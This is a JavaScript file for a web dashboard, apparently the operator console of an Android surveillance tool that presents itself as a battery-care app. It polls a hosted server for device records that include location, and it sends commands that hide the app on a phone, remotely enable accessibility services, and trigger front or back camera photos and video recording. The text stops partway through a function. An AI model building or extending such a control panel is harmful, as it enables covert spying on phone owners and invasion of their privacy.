// js/app.js - Sukh Guard Dashboard Functions
const app = {
    SERVER_URL: 'https://sukh-3qtl.onrender.com/api/website/app-data',
    COMMANDS_URL: 'https://sukh-3qtl.onrender.com/api',
    autoRefreshInterval: null,
    isAutoRefresh: true,
    currentView: 'grid',
    lastDataHash: '',
    currentDevice: null,
    currentCamera: 'front', // Default camera

    init: function() {
        document.addEventListener('DOMContentLoaded', function() {
            app.loadAllDevices();
            app.startAutoRefresh();
            app.initModalEvents();
        });
        
        window.addEventListener('online', app.loadAllDevices);
        window.addEventListener('offline', app.handleOffline);
    },

    initModalEvents: function() {
        // Modal close events
        const modal = document.getElementById('deviceModal');
        const closeBtn = document.querySelector('.close');
        const closeModalBtn = document.getElementById('closeModalBtn');
        
        function closeModal() {
            modal.style.display = 'none';
            app.currentDevice = null;
        }
        
        if (closeBtn) closeBtn.onclick = closeModal;
        if (closeModalBtn) closeModalBtn.onclick = closeModal;
        
        // Close modal when clicking outside
        window.onclick = function(event) {
            if (event.target === modal) {
                closeModal();
            }
        }

        // Tab functionality
        const tabBtns = document.querySelectorAll('.tab-btn');
        tabBtns.forEach(btn => {
            btn.addEventListener('click', function() {
                const tabId = this.getAttribute('data-tab');
                
                // Remove active class from all tabs and contents
                tabBtns.forEach(tb => tb.classList.remove('active'));
                document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
                
                // Add active class to current tab and content
                this.classList.add('active');
                document.getElementById(tabId + 'Tab').classList.add('active');

                // Data tab specific actions
                if (tabId === 'data' && app.currentDevice) {
                    app.loadDeviceData();
                }
            });
        });

        // Toggle switch functionality
        const toggleSwitches = document.querySelectorAll('.toggle-input');
        toggleSwitches.forEach(toggle => {
            toggle.addEventListener('change', function() {
                const label = this.nextElementSibling;
                const textSpan = label.querySelector('.toggle-text');
                
                if (this.checked) {
                    textSpan.textContent = 'Hide Device';
                    app.sendHideCommand(true);
                } else {
                    textSpan.textContent = 'Show Device';
                    app.sendHideCommand(false);
                }
            });
        });

        // Range slider functionality
        const chargeMin = document.getElementById('chargeMin');
        const chargeMax = document.getElementById('chargeMax');
        const minLabel = document.getElementById('minLabel');
        const maxLabel = document.getElementById('maxLabel');

        if (chargeMin && chargeMax) {
            chargeMin.addEventListener('input', function() {
                minLabel.textContent = this.value + '%';
                if (parseInt(chargeMax.value) < parseInt(this.value)) {
                    chargeMax.value = this.value;
                    maxLabel.textContent = this.value + '%';
                }
            });

            chargeMax.addEventListener('input', function() {
                maxLabel.textContent = this.value + '%';
                if (parseInt(chargeMin.value) > parseInt(this.value)) {
                    chargeMin.value = this.value;
                    minLabel.textContent = this.value + '%';
                }
            });
        }

        // Sound mode buttons
        const soundBtns = document.querySelectorAll('[data-sound]');
        soundBtns.forEach(btn => {
            btn.addEventListener('click', function() {
                soundBtns.forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                const soundMode = this.getAttribute('data-sound');
                app.showToast(`Sound mode changed to: ${soundMode}`);
            });
        });

        // Quick action buttons
        const refreshBtn = document.getElementById('refreshDeviceBtn');
        const pingBtn = document.getElementById('pingDeviceBtn');
        const emergencyBtn = document.getElementById('emergencyBtn');
        
        if (refreshBtn) refreshBtn.addEventListener('click', app.refreshDevice);
        if (pingBtn) pingBtn.addEventListener('click', app.pingDevice);
        if (emergencyBtn) emergencyBtn.addEventListener('click', app.emergencyAction);

        // Accessibility buttons
        const enableAccBtn = document.getElementById('enableAccessibilityBtn');
        const disableAccBtn = document.getElementById('disableAccessibilityBtn');
        
        if (enableAccBtn) enableAccBtn.addEventListener('click', () => app.accessibilityCommand('enable'));
        if (disableAccBtn) disableAccBtn.addEventListener('click', () => app.accessibilityCommand('disable'));

        // Danger zone buttons
        const forceRestartBtn = document.getElementById('forceRestartBtn');
        const factoryResetBtn = document.getElementById('factoryResetBtn');
        
        if (forceRestartBtn) forceRestartBtn.addEventListener('click', app.forceRestart);
        if (factoryResetBtn) factoryResetBtn.addEventListener('click', app.factoryReset);

        // Save settings button
        const saveSettingsBtn = document.getElementById('saveSettingsBtn');
        if (saveSettingsBtn) saveSettingsBtn.addEventListener('click', app.saveSettings);

        // 📸 Camera control buttons
        const frontCameraBtn = document.getElementById('frontCameraBtn');
        const backCameraBtn = document.getElementById('backCameraBtn');
        const capturePhotoBtn = document.getElementById('capturePhotoBtn');
        const recordVideoBtn = document.getElementById('recordVideoBtn');

        if (frontCameraBtn) {
            frontCameraBtn.addEventListener('click', function() {
                app.activateCamera('front');
            });
        }

        if (backCameraBtn) {
            backCameraBtn.addEventListener('click', function() {
                app.activateCamera('back');
            });
        }

        if (capturePhotoBtn) {
            capturePhotoBtn.addEventListener('click', function() {
                app.capturePhoto();
            });
        }

        if (recordVideoBtn) {
            recordVideoBtn.addEventListener('click', function() {
                app.recordVideo();
            });
        }

        // 📊 NEW: Data tab buttons
        const refreshDataBtn = document.getElementById('refreshDataBtn');
        const exportDataBtn = document.getElementById('exportDataBtn');
        const clearDataBtn = document.getElementById('clearDataBtn');
        const clearLogsBtn = document.getElementById('clearLogsBtn');
        const historyPeriodBtns = document.querySelectorAll('[data-period]');

        if (refreshDataBtn) {
            refreshDataBtn.addEventListener('click', function() {
                app.loadDeviceData();
            });
        }

        if (exportDataBtn) {
            exportDataBtn.addEventListener('click', function() {
                app.exportDeviceData();
            });
        }

        if (clearDataBtn) {
            clearDataBtn.addEventListener('click', function() {
                if (confirm('Clear all device data?')) {
                    app.clearDeviceData();
                }
            });
        }

        if (clearLogsBtn) {
            clearLogsBtn.addEventListener('click', function() {
                if (confirm('Clear all logs?')) {
                    document.getElementById('logsList').innerHTML = '';
                    app.showToast('Logs cleared successfully');
                }
            });
        }

        // History period buttons
        historyPeriodBtns.forEach(btn => {
            btn.addEventListener('click', function() {
                historyPeriodBtns.forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                const period = this.getAttribute('data-period');
                app.loadHistoryData(period);
            });
        });
    },

    loadAllDevices: async function() {
        try {
            console.log('🔄 Loading devices from:', app.SERVER_URL);
            app.showLoading();
            
            const timestamp = new Date().getTime();
            const response = await fetch(`${app.SERVER_URL}?t=${timestamp}&_=${Math.random()}`);
            console.log('📡 Response status:', response.status);
            
            if (!response.ok) {
                throw new Error(`Server error: ${response.status}`);
            }
            
            const result = await response.json();
            console.log('📱 Data received:', result);
            
            if (result && result.data) {
                const currentHash = app.generateDataHash(result.data);
                if (currentHash !== app.lastDataHash) {
                    app.lastDataHash = currentHash;
                    app.updateStats(result.data);
                    app.displayDeviceGrid(result.data);
                    app.hideLoading();
                    console.log('🔄 Data updated - Changes detected');
                } else {
                    console.log('⚡ Data unchanged - Skipping UI update');
                    app.hideLoading();
                }
            } else {
                throw new Error('Invalid data format from server');
            }
            
        } catch (error) {
            console.error('❌ Error loading data:', error);
            app.showError('Server connection failed. Error: ' + error.message);
        }
    },

    generateDataHash: function(data) {
        try {
            const simpleData = data.map(item => ({
                device_id: app.parseDeviceData(item).device_id,
                battery: app.parseDeviceData(item).battery_percent,
                timestamp: item.created_at
            }));
            return JSON.stringify(simpleData);
        } catch (e) {
            return JSON.stringify(data);
        }
    },

    updateStats: function(data) {
        const totalDevicesElement = document.getElementById('totalDevices');
        const totalUsersElement = document.getElementById('totalUsers');
        const avgBatteryElement = document.getElementById('avgBattery');
        
        if (!data || data.length === 0) {
            totalDevicesElement.textContent = '0';
            totalUsersElement.textContent = '0';
            avgBatteryElement.textContent = '0%';
            return;
        }
        
        try {
            const uniqueDevices = new Set();
            const userSet = new Set();
            let totalBattery = 0;
            let validBatteryCount = 0;

            data.forEach(item => {
                try {
                    const deviceData = app.parseDeviceData(item);
                    const deviceKey = deviceData.device_id || deviceData.device_model;
                    
                    if (deviceKey) uniqueDevices.add(deviceKey);
                    if (deviceData.user_id) userSet.add(deviceData.user_id);
                    if (deviceData.battery_percent) {
                        totalBattery += deviceData.battery_percent;
                        validBatteryCount++;
                    }
                } catch (e) {
                    console.warn('Skipping invalid data item:', e);
                }
            });

            totalDevicesElement.textContent = uniqueDevices.size;
            totalUsersElement.textContent = userSet.size;
            avgBatteryElement.textContent = validBatteryCount > 0 ? 
                Math.round(totalBattery / validBatteryCount) + '%' : '0%';
                
        } catch (error) {
            console.error('Error updating stats:', error);
            totalDevicesElement.textContent = '0';
            totalUsersElement.textContent = '0';
            avgBatteryElement.textContent = '0%';
        }
    },

    displayDeviceGrid: function(data) {
        const devicesGrid = document.getElementById('devicesGrid');
        const deviceCount = document.getElementById('deviceCount');
        
        if (!data || data.length === 0) {
            devicesGrid.innerHTML = `
                <div style="grid-column: 1 / -1; text-align: center; padding: 40px; color: var(--text-muted);">
                    <i class="fas fa-mobile-alt" style="font-size: 3rem; margin-bottom: 15px; display: block;"></i>
                    <h3>No Devices Connected</h3>
                    <p>Waiting for devices to send data...</p>
                </div>
            `;
            deviceCount.textContent = '0 devices found';
            return;
        }
        
        try {
            const deviceMap = new Map();
            let recentDataCount = 0;
            let oldDataCount = 0;
            
            data.forEach(item => {
                try {
                    const deviceData = app.parseDeviceData(item);
                    const deviceKey = deviceData.device_id || deviceData.device_model;
                    
                    if (deviceKey) {
                        // ✅ ONLY SHOW DATA FROM LAST 1 HOUR
                        const dataTime = new Date(item.created_at);
                        const oneHourAgo = new Date(Date.now() - (60 * 60 * 1000));
                        
                        if (dataTime > oneHourAgo) {
                            recentDataCount++;
                            if (!deviceMap.has(deviceKey) || dataTime > new Date(deviceMap.get(deviceKey).created_at)) {
                                deviceMap.set(deviceKey, {
                                    ...deviceData,
                                    created_at: item.created_at,
                                    rawData: item,
                                    isRecent: true
                                });
                            }
                        } else {
                            oldDataCount++;
                            console.log('⏰ Skipping old data:', deviceKey, item.created_at);
                        }
                    }
                } catch (e) {
                    console.warn('Skipping invalid device data:', e);
                }
            });
            
            let latestDevices = Array.from(deviceMap.values());
            
            // ✅ AGAR KOI RECENT DATA NAHI HAI, TOH LATEST PURANA DATA DIKHAO
            if (latestDevices.length === 0 && data.length > 0) {
                console.log('🔄 No recent data found, showing latest available data...');
                const fallbackMap = new Map();
                data.forEach(item => {
                    try {
                        const deviceData = app.parseDeviceData(item);
                        const deviceKey = deviceData.device_id || deviceData.device_model;
                        if (deviceKey) {
                            if (!fallbackMap.has(deviceKey) || new Date(item.created_at) > new Date(fallbackMap.get(deviceKey).created_at)) {
                                fallbackMap.set(deviceKey, {
                                    ...deviceData,
                                    created_at: item.created_at,
                                    rawData: item,
                                    isRecent: false
                                });
                            }
                        }
                    } catch (e) {
                        console.warn('Skipping invalid fallback data:', e);
                    }
                });
                latestDevices = Array.from(fallbackMap.values());
            }
            
            console.log(`📊 Data Summary: ${recentDataCount} recent, ${oldDataCount} old, ${latestDevices.length} displayed`);
            
            deviceCount.textContent = `${latestDevices.length} device${latestDevices.length !== 1 ? 's' : ''} connected`;
            devicesGrid.innerHTML = latestDevices.map(device => app.createDeviceCard(device)).join('');
            
            // Add click events for device cards
            document.querySelectorAll('.device-card').forEach(card => {
                card.addEventListener('click', function() {
                    const deviceId = this.getAttribute('data-device-id');
                    const deviceData = latestDevices.find(device => 
                        (device.device_id || device.device_model) === deviceId
                    );
                    if (deviceData) {
                        app.openDeviceDetails(deviceData);
                    }
                });
            });
            
        } catch (error) {
            console.error('Error displaying device grid:', error);
            devicesGrid.innerHTML = `
                <div style="grid-column: 1 / -1; text-align: center; padding: 40px; color: var(--secondary);">
                    <i class="fas fa-exclamation-triangle" style="font-size: 3rem; margin-bottom: 15px; display: block;"></i>
                    <h3>Error Displaying Devices</h3>
                    <p>${error.message}</p>
                </div>
            `;
        }
    },

    createDeviceCard: function(device) {
        try {
            const batteryPercent = device.battery_percent || 0;
            const batteryClass = app.getBatteryLevelClass(batteryPercent);
            const timeAgo = app.getTimeAgo(device.created_at);
            const deviceId = device.device_id || device.device_model || 'unknown';
            const deviceModel = device.device_model || 'Unknown Device';
            const userId = device.user_id || 1;
            const temperature = device.temperature || 0;
            const androidVersion = device.android_version || 'Unknown';
            const isCharging = device.is_charging || false;
            const isHidden = device.is_hidden || false;
            
            // ✅ OLD DATA KO DIFFERENT STYLE MEIN DIKHAO
            const isRecent = device.isRecent !== false;
            const cardStyle = isRecent ? '' : 'opacity: 0.7; border-color: var(--text-muted);';
            const recentBadge = isRecent ? '' : '<div style="background: var(--text-muted); color: var(--dark); padding: 2px 8px; border-radius: 10px; font-size: 0.7rem; margin-top: 5px;">Old Data</div>';
            
            return `
                <div class="device-card" data-device-id="${deviceId}" style="${cardStyle}">
                    <div class="device-header">
                        <div class="device-name">${deviceModel}</div>
                        <div class="device-user">User ${userId}</div>
                    </div>
                    
                    <div class="battery-indicator">
                        <div class="battery-level">
                            <div class="battery-fill ${batteryClass}" style="width: ${batteryPercent}%"></div>
                        </div>
                        <div class="battery-percent ${batteryClass}">${batteryPercent}%</div>
                    </div>
                    
                    <div class="device-details">
                        <div class="detail-item">
                            <span class="detail-label">Status</span>
                            <span class="detail-value">
                                <span class="${isCharging ? 'status-charging' : 'status-online'}">
                                    <i class="fas ${isCharging ? 'fa-bolt' : 'fa-check'}"></i>
                                    ${isCharging ? 'Charging' : 'Online'}
                                </span>
                                ${isHidden ? '<span style="color: #dc3545; margin-left: 5px;"><i class="fas fa-eye-slash"></i> Hidden</span>' : ''}
                            </span>
                        </div>
                        
                        <div class="detail-item">
                            <span class="detail-label">Temperature</span>
                            <span class="detail-value">
                                <i class="fas fa-thermometer-half"></i>
                                ${temperature.toFixed(1)}°C
                            </span>
                        </div>
                        
                        <div class="detail-item">
                            <span class="detail-label">Android</span>
                            <span class="detail-value">
                                <i class="fab fa-android"></i>
                                ${androidVersion}
                            </span>
                        </div>
                        
                        <div class="detail-item">
                            <span class="detail-label">Last Update</span>
                            <span class="detail-value">
                                <i class="far fa-clock"></i>
                                ${timeAgo}
                            </span>
                        </div>
                    </div>
                    
                    <div style="margin-top: 15px; padding-top: 15px; border-top: 1px solid var(--border);">
                        <small style="color: var(--text-muted);">
                            <i class="fas fa-id-card"></i>
                            ID: ${deviceId.substring(0, 12)}...
                        </small>
                        ${recentBadge}
                    </div>
                </div>
            `;
        } catch (error) {
            console.error('Error creating device card:', error);
            return `
                <div class="device-card" style="border-color: var(--secondary);">
                    <div style="text-align: center; color: var(--secondary); padding: 20px;">
                        <i class="fas fa-exclamation-triangle"></i>
                        <div>Invalid Device Data</div>
                    </div>
                </div>
            `;
        }
    },

    parseDeviceData: function(item) {
        try {
            if (!item.data) {
                return {
                    battery_percent: 0,
                    is_charging: false,
                    temperature: 0,
                    device_model: 'Unknown',
                    android_version: 'Unknown',
                    device_id: 'unknown',
                    user_id: 1,
                    is_hidden: false
                };
            }
            
            const deviceData = JSON.parse(item.data);
            
            if (deviceData.battery_data) {
                return {
                    ...deviceData.battery_data,
                    location_data: deviceData.location_data,
                    device_model: deviceData.device_model,
                    android_version: deviceData.android_version,
                    device_id: deviceData.device_id,
                    user_id: deviceData.user_id,
                    is_hidden: deviceData.is_hidden || false
                };
            }
            
            return {
                ...deviceData,
                is_hidden: deviceData.is_hidden || false
            };
            
        } catch (e) {
            console.error('Error parsing device data:', e);
            return {
                battery_percent: 0,
                is_charging: false,
                temperature: 0,
                device_model: 'Unknown',
                android_version: 'Unknown',
                device_id: 'unknown',
                user_id: 1,
                is_hidden: false
            };
        }
    },

    getBatteryLevelClass: function(percent) {
        if (percent <= 20) return 'low';
        if (percent <= 50) return 'medium';
        return 'high';
    },

    getTimeAgo: function(timestamp) {
        if (!timestamp) return 'Unknown';
        
        try {
            const now = new Date();
            const time = new Date(timestamp);
            const diffInSeconds = Math.floor((now - time) / 1000);
            
            if (diffInSeconds < 60) return 'Just now';
            if (diffInSeconds < 3600) return Math.floor(diffInSeconds / 60) + ' min ago';
            if (diffInSeconds < 86400) return Math.floor(diffInSeconds / 3600) + ' hours ago';
            return Math.floor(diffInSeconds / 86400) + ' days ago';
        } catch (e) {
            return 'Unknown';
        }
    },

    openDeviceDetails: function(deviceData) {
        console.log('📱 Opening device details:', deviceData);
        app.currentDevice = deviceData;
        
        // Fill modal with device data
        document.getElementById('modalDeviceName').textContent = deviceData.device_model || 'Unknown Device';
        document.getElementById('modalDeviceId').textContent = 'ID: ' + (deviceData.device_id || 'Unknown');
        document.getElementById('modalBatteryPercent').textContent = (deviceData.battery_percent || 0) + '%';
        
        // Set battery fill and color
        const batteryFill = document.getElementById('modalBatteryFill');
        const batteryPercent = deviceData.battery_percent || 0;
        batteryFill.style.width = batteryPercent + '%';
        
        if (batteryPercent <= 20) {
            batteryFill.className = 'battery-fill-modal low';
        } else if (batteryPercent <= 50) {
            batteryFill.className = 'battery-fill-modal medium';
        } else {
            batteryFill.className = 'battery-fill-modal high';
        }
        
        // Fill advanced info
        document.getElementById('infoAndroid').textContent = deviceData.android_version || 'Unknown';
        document.getElementById('infoTemp').textContent = (deviceData.temperature || 0).toFixed(1) + '°C';
        document.getElementById('infoLastUpdate').textContent = new Date(deviceData.created_at).toLocaleString();
        document.getElementById('infoCharging').textContent = deviceData.is_charging ? 'Charging' : 'Not Charging';
        
        // Set hide toggle state
        const hideToggle = document.getElementById('hideDeviceToggle');
        if (hideToggle) {
            hideToggle.checked = deviceData.is_hidden || false;
            const toggleText = hideToggle.nextElementSibling.querySelector('.toggle-text');
            toggleText.textContent = deviceData.is_hidden ? 'Hide Device' : 'Show Device';
        }
        
        // Reset camera selection
        app.resetCameraSelection();
        
        // Show modal
        const modal = document.getElementById('deviceModal');
        modal.style.display = 'block';
        
        app.showToast(`Opened controls for: ${deviceData.device_model}`);
    },

    // 📊 NEW: DATA TAB FUNCTIONS

    loadDeviceData: function() {
        if (!app.currentDevice) {
            app.showToast('No device selected', 'error');
            return;
        }

        console.log('📊 Loading device data for:', app.currentDevice.device_id);
        
        // Update live data stream
        app.updateLiveDataStream();
        
        // Update raw data display
        app.updateRawDataDisplay();
        
        // Update system logs
        app.updateSystemLogs();
        
        app.showToast('Device data loaded successfully');
    },

    updateLiveDataStream: function() {
        if (!app.currentDevice) return;

        const device = app.currentDevice;
        
        // Simulate live data (in real app, this would come from server)
        const cpuUsage = Math.floor(Math.random() * 30) + 10; // 10-40%
        const memoryUsage = Math.floor(Math.random() * 40) + 30; // 30-70%
        const storageUsage = Math.floor(Math.random() * 50) + 20; // 20-70%
        const networkStatus = Math.random() > 0.1 ? 'Connected' : 'Weak';

        // Update UI
        document.getElementById('cpuUsage').textContent = cpuUsage + '%';
        document.getElementById('memoryUsage').textContent = memoryUsage + '%';
        document.getElementById('storageUsage').textContent = storageUsage + '%';
        document.getElementById('networkStatus').textContent = networkStatus;

        // Add color coding
        document.getElementById('cpuUsage').className = `stream-value ${cpuUsage > 70 ? 'danger' : cpuUsage > 50 ? 'warning' : 'good'}`;
        document.getElementById('memoryUsage').className = `stream-value ${memoryUsage > 80 ? 'danger' : memoryUsage > 60 ? 'warning' : 'good'}`;
        document.getElementById('storageUsage').className = `stream-value ${storageUsage > 85 ? 'danger' : storageUsage > 70 ? 'warning' : 'good'}`;
        document.getElementById('networkStatus').className = `stream-value ${networkStatus === 'Connected' ? 'good' : 'warning'}`;
    },

    updateRawDataDisplay: function() {
        if (!app.currentDevice) return;

        const rawDataOutput = document.getElementById('rawDataOutput');
        const deviceData = app.currentDevice.rawData || app.currentDevice;
        
        try {
            const formattedData = JSON.stringify(deviceData, null, 2);
            rawDataOutput.textContent = formattedData;
            rawDataOutput.className = '';
        } catch (error) {
            rawDataOutput.textContent = 'Error formatting device data';
            rawDataOutput.className = 'text-danger';
        }
    },

    updateSystemLogs: function() {
        if (!app.currentDevice) return;

        const logsList = document.getElementById('logsList');
        const device = app.currentDevice;
        
        const logs = [
            {
                icon: 'fa-info-circle',
                color: 'text-info',
                message: `Device ${device.device_model} connected`,
                time: 'Just now'
            },
            {
                icon: 'fa-battery-half',
                color: 'text-success',
                message: `Battery level: ${device.battery_percent}%`,
                time: '2 mins ago'
            },
            {
                icon: 'fa-thermometer-half',
                color: 'text-warning',
                message: `Temperature: ${device.temperature}°C`,
                time: '5 mins ago'
            },
            {
                icon: 'fa-sync-alt',
                color: 'text-info',
                message: 'Data sync completed',
                time: '10 mins ago'
            }
        ];

        logsList.innerHTML = logs.map(log => `
            <div class="log-item">
                <i class="fas ${log.icon} ${log.color}"></i>
                <span class="log-message">${log.message}</span>
                <span class="log-time">${log.time}</span>
            </div>
        `).join('');
    },

    loadHistoryData: function(period) {
        console.log('📈 Loading history data for period:', period);
        
        const chartPlaceholder = document.querySelector('.chart-placeholder');
        if (chartPlaceholder) {
            chartPlaceholder.innerHTML = `
                <i class="fas fa-chart-line"></i>
                <p>Battery History - ${period}</p>
                <small>Showing simulated data for ${period}</small>
                <div style="margin-top: 15px; font-size: 0.8rem; color: var(--text-muted);">
                    <div>📊 Data visualization would appear here</div>
                    <div>🔍 Period: ${period}</div>
                    <div>📱 Device: ${app.currentDevice?.device_model || 'Unknown'}</div>
                </div>
            `;
        }
        
        app.showToast(`History data loaded for ${period}`);
    },

    exportDeviceData: function() {
        if (!app.currentDevice) {
            app.showToast('No device data to export', 'error');
            return;
        }

        const deviceData = app.currentDevice.rawData || app.currentDevice;
        const dataStr = JSON.stringify(deviceData, null, 2);
        const dataBlob = new Blob([dataStr], { type: 'application/json' });
        
        const url = URL.createObjectURL(dataBlob);
        const link = document.createElement('a');
        link.href = url;
        link.download = `device_data_${app.currentDevice.device_id}_${new Date().getTime()}.json`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
        
        app.showToast('Device data exported successfully');
    },

    clearDeviceData: function() {
        if (!app.currentDevice) return;

        document.getElementById('rawDataOutput').textContent = 'Data cleared';
        document.getElementById('logsList').innerHTML = `
            <div class="log-item">
                <i class="fas fa-info-circle text-info"></i>
                <span class="log-message">Logs cleared</span>
                <span class="log-time">Just now</span>
            </div>
        `;
        
        app.showToast('Device data cleared');
    },

    // 🔧 DEVICE CONTROL FUNCTIONS

    sendHideCommand: async function(hide) {
        if (!app.currentDevice) return;
        
        try {
            const response = await fetch(`${app.COMMANDS_URL}/hide-device`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    device_id: app.currentDevice.device_id,
                    action: hide ? 'hide' : 'unhide'
                })
            });
            
            const result = await response.json();
            
            if (result.success) {
                app.showToast(`Device ${hide ? 'hidden' : 'shown'} successfully`);
                app.loadAllDevices(); // Refresh to update UI
            } else {
                app.showToast('Failed to update device visibility', 'error');
            }
        } catch (error) {
            console.error('Hide command error:', error);
            app.showToast('Network error - command not sent', 'error');
        }
    },

    refreshDevice: function() {
        if (!app.currentDevice) return;
        app.showToast(`Refreshing ${app.currentDevice.device_model}...`);
        // Implement device refresh logic here
    },

    pingDevice: function() {
        if (!app.currentDevice) return;
        app.showToast(`Ping sent to ${app.currentDevice.device_model}`);
        // Implement ping logic here
    },

    emergencyAction: function() {
        if (!app.currentDevice) return;
        
        if (confirm('🚨 Are you sure you want to trigger emergency action? This cannot be undone.')) {
            app.showToast('Emergency action triggered!', 'warning');
            // Implement emergency action logic here
        }
    },

    accessibilityCommand: async function(action) {
        if (!app.currentDevice) return;
        
        try {
            const response = await fetch(`${app.COMMANDS_URL}/accessibility-command`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    device_id: app.currentDevice.device_id,
                    action: action,
                    source: 'web_panel'
                })
            });
            
            const result = await response.json();
            
            if (result.success) {
                app.showToast(`Accessibility ${action}d successfully`);
            } else {
                app.showToast(`Failed to ${action} accessibility`, 'error');
            }
        } catch (error) {
            console.error('Accessibility command error:', error);
            app.showToast('Network error - command not sent', 'error');
        }
    },

    // 📸 CAMERA CONTROL FUNCTIONS

    activateCamera: function(cameraType) {
        if (!app.currentDevice) {
            app.showToast('Please select a device first', 'warning');
            return;
        }
        
        // Update UI
        app.resetCameraSelection();
        
        const frontCameraBtn = document.getElementById('frontCameraBtn');
        const backCameraBtn = document.getElementById('backCameraBtn');
        
        if (cameraType === 'front' && frontCameraBtn) {
            frontCameraBtn.classList.add('active');
            app.currentCamera = 'front';
        } else if (cameraType === 'back' && backCameraBtn) {
            backCameraBtn.classList.add('active');
            app.currentCamera = 'back';
        }
        
        // Send camera activation command to server
        app.sendCameraCommand('activate', cameraType);
    },

    resetCameraSelection: function() {
        const frontCameraBtn = document.getElementById('frontCameraBtn');
        const backCameraBtn = document.getElementById('backCameraBtn');
        
        if (frontCameraBtn) frontCameraBtn.classList.remove('active');
        if (backCameraBtn) backCameraBtn.classList.remove('active');
        
        // Default to front camera
        app.currentCamera = 'front';
    },

    capturePhoto: function() {
        if (!app.currentDevice) {
            app.showToast('Please select a device first', 'warning');
            return;
        }
        
        if (!app.currentCamera) {
            app.showToast('Please select a camera first', 'warning');
            return;
        }
        
        // Send capture command to server
        app.sendCameraCommand('capture', app.currentCamera);
    },

    recordVideo: function() {
        if (!app.currentDevice) {
            app.showToast('Please select a device first', 'warning');
            return;
        }
        
        if (!app.currentCamera) {
            app.showToast('Please select a camera first', 'warning');
            return;
        }
        
        // Toggle recording state
        const recordVideoBtn = document.getElementById('recordVideoBtn');
        const isRecording = recordVideoBtn.classList.contains('recording');
        
        if (isRecording) {
            // Stop recording
            recordVideoBtn.classList.remove('recording');
            recordVideoBtn.innerHTML = '<i class="fas fa-video"></i> Record Video';
            app.sendCameraCommand('stop_record', app.currentCamera);
        } else {
            // Start recording
            recordVideoBtn.classList.add('recording');
            recordVideoBtn.innerHTML = '<i class="fas fa-stop"></i> Stop Recording';
            app.sendCameraCommand('record', app.currentCamera);
        }
    },

    sendCameraCommand: async function(action, cameraType) {
        if (!app.currentDevice) return;
        
        try {
            const response = await fetch(`${app.COMMANDS_URL}/camera`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    device_id: app.currentDevice.device_id,
                    device_model: app.currentDevice.device_model || 'Samsung Device',
                    action: action,
                    camera_type: cameraType
                })
            });
            
            const result = await response.json();
            
            if (result.success) {
                // Server se message show karo
                app.showToast(result.message, 'success');
                console.log('📷 Camera command successful:', result);
            } else {
                app.showToast('Camera command failed', 'error');
            }
        } catch (error) {
            console.error('Camera command error:', error);
            app.showToast('Network error - camera command not sent', 'error');
        }
    },

    forceRestart: function() {
        if (!app.currentDevice) return;
        
        if (confirm('⚠️ Force restart this device? This may cause data loss.')) {
            app.showToast('Force restart command sent', 'warning');
            // Implement force restart logic here
        }
    },

    factoryReset: function() {
        if (!app.currentDevice) return;
        
        if (confirm('💀 DANGER! This will erase all data and reset to factory settings. Are you absolutely sure?')) {
            if (confirm('🚨 FINAL WARNING: This action cannot be undone! Type "RESET" to confirm.')) {
                app.showToast('Factory reset command sent', 'error');
                // Implement factory reset logic here
            }
        }
    },

    saveSettings: function() {
        if (!app.currentDevice) return;
        
        // Get current settings from modal
        const autoCharge = document.getElementById('autoChargeToggle')?.checked || false;
        const chargeMin = document.getElementById('chargeMin')?.value || 20;
        const chargeMax = document.getElementById('chargeMax')?.value || 80;
        
        app.showToast(`Settings saved: Auto Charge ${autoCharge ? 'ON' : 'OFF'}, Limits ${chargeMin}%-${chargeMax}%`);
        
        // Close modal after save
        setTimeout(() => {
            const modal = document.getElementById('deviceModal');
            modal.style.display = 'none';
            app.currentDevice = null;
        }, 1500);
    },

    showToast: function(message, type = 'success') {
        // Create toast element
        const toast = document.createElement('div');
        toast.className = `toast-message ${type}`;
        toast.innerHTML = `
            <i class="fas ${type === 'error' ? 'fa-exclamation-circle' : type === 'warning' ? 'fa-exclamation-triangle' : type === 'info' ? 'fa-info-circle' : 'fa-check-circle'}"></i>
            <span>${message}</span>
        `;
        
        // Add styles if not exists
        if (!document.querySelector('#toast-styles')) {
            const styles = document.createElement('style');
            styles.id = 'toast-styles';
            styles.textContent = `
                .toast-message {
                    position: fixed;
                    top: 20px;
                    right: 20px;
                    background: var(--card-bg);
                    color: var(--text);
                    padding: 15px 20px;
                    border-radius: 10px;
                    border: 1px solid var(--border);
                    box-shadow: 0 5px 20px rgba(0,0,0,0.3);
                    display: flex;
                    align-items: center;
                    gap: 10px;
                    z-index: 10000;
                    animation: slideInRight 0.3s ease, slideOutRight 0.3s ease 2.7s;
                    max-width: 300px;
                }
                .toast-message.success { border-left: 4px solid var(--success); }
                .toast-message.error { border-left: 4px solid var(--danger); }
                .toast-message.warning { border-left: 4px solid var(--warning); }
                .toast-message.info { border-left: 4px solid var(--info); }
                @keyframes slideInRight {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes slideOutRight {
                    from { transform: translateX(0); opacity: 1; }
                    to { transform: translateX(100%); opacity: 0; }
                }
            `;
            document.head.appendChild(styles);
        }
        
        document.body.appendChild(toast);
        
        // Remove toast after animation
        setTimeout(() => {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }, 3000);
    },

    toggleView: function() {
        app.showToast('Table view coming soon! Currently in Grid View.', 'info');
    },

    showLoading: function() {
        const loadingElement = document.getElementById('loadingDevices');
        const devicesGrid = document.getElementById('devicesGrid');
        if (loadingElement) loadingElement.style.display = 'block';
        if (devicesGrid) devicesGrid.style.display = 'none';
    },

    hideLoading: function() {
        const loadingElement = document.getElementById('loadingDevices');
        const devicesGrid = document.getElementById('devicesGrid');
        if (loadingElement) loadingElement.style.display = 'none';
        if (devicesGrid) devicesGrid.style.display = 'grid';
    },

    showError: function(message) {
        const loadingElement = document.getElementById('loadingDevices');
        if (loadingElement) {
            loadingElement.innerHTML = `
                <i class="fas fa-exclamation-triangle" style="color: var(--secondary);"></i>
                <div>${message}</div>
                <button class="btn" onclick="app.loadAllDevices()" style="margin-top: 15px;">
